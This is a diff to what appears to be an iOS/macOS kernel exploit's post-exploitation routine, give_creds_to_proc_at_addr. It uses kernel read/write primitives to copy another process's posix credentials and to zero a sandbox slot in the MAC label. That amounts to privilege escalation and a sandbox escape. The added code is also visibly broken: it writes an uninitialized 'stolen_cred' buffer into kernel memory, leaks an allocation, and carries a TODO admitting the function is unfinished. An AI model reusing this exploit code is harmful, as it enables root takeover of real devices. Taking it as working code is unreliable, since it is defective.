@@ -79,7 +79,38 @@ kptr_t give_creds_to_proc_at_addr(kptr_t proc, kptr_t creds) {
         return (kptr_t)NULL;
     } else manticore_info("[give_creds_to_proc_at_addr] old_creds stored at %#0llx", old_creds);
     
-    kapi_write64(our_creds, creds); // update creds
+    if(g_exp.debug){
+        printf("---> Trying to steal creds @0x%llx's...\n", proc);
+        
+        
+        kptr_t cred_posix = creds + OFFSET(ucred, cr_posix);
+        size_t cred_posix_size = SIZE(posix_cred);
+        char stolen_cred[cred_posix_size];
+        struct proc_cred *cred_label;
+        
+        if(cred_posix_size > sizeof(cred_label->posix_cred)){
+            printf("Error:\tstruct proc_cred should be bigger.");
+            exit(0);
+        }
+        
+        cred_label = (struct proc_cred *)malloc(sizeof(*cred_label));
+        kapi_read(cred_posix, cred_label->posix_cred, cred_posix_size);
+        cred_label->cr_label = kapi_read64(cred_posix + SIZE(posix_cred));
+        cred_label->sandbox_slot = 0;
+        
+        if(cred_label->cr_label) {
+            kptr_t cr_label = cred_label->cr_label | 0xffffff8000000000;
+            cred_label->sandbox_slot = kapi_read64(cr_label + 0x10);
+            kapi_write64(cr_label + 0x10, 0x0);
+        }
+        
+        // TODO: fix this function by trnalsating it from proc_set_root_cred
+        
+        kapi_write(cred_posix, stolen_cred, cred_posix_size);
+        printf("---> Done\n");
+    }
+    
+  //  kapi_write64(our_creds, creds); // update creds
     
     return old_creds;
 }
